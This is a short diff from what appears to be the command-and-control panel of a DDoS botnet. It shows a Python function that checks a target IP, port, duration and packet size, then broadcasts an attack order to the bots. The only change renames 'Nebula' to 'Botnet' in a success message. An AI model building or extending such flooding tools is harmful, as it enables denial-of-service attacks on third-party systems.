@@ -10,7 +10,7 @@ def tup(args, validate_ip, validate_port, validate_time, validate_size, send, cl
             if validate_port(port, True):
                 if validate_time(secs):
                     if validate_size(size):
-                        send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
+                        send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Botnet {Fore.LIGHTWHITE_EX}servers!")
                         broadcast(data)
                     else:
                         send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
